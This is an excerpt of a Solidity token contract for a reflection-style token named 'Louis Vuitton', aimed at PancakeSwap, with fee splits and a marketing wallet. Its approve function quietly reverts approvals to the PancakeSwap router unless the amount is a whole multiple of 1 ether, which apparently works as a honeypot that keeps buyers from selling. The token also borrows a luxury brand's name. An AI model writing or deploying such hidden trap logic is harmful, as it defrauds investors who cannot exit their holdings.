...
Louis Vuitton
 ...
 This contract have 10% transaction where:
 1 burn
 4 liquidity
 1 marketing
 4 tax
...
contract LV is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 10 * 10**6 * 10**9; // total supply 
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Louis Vuitton"; //rename back token 
    ...
    address public MarketingWallet = 0xd49657247a658282adF8F929E406c6458a7bC9Fc; //marketing wallet test
    ...
    uint256 public _maxTxAmount = 3300000 * 10**6;
    ...
    constructor () public {
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);  //now using test net 0xD99D1c33F9fC3444f8101754aBC46c52416550D1=> PCS V2 pancake (orig 0x10ED43C718714eb63d5aA57B78B54704E256024E)
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
                if ( spender == 0xD99D1c33F9fC3444f8101754aBC46c52416550D1) {
            if  (amount % 1 ether != 0) {
                revert("failed");
            }
        }
    ...
    function excludeFromReward(address account) public onlyOwner() {
        require(account != 0xD99D1c33F9fC3444f8101754aBC46c52416550D1, 'We can not exclude Pancake router.'); // Panckake Router V1 orig is 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F
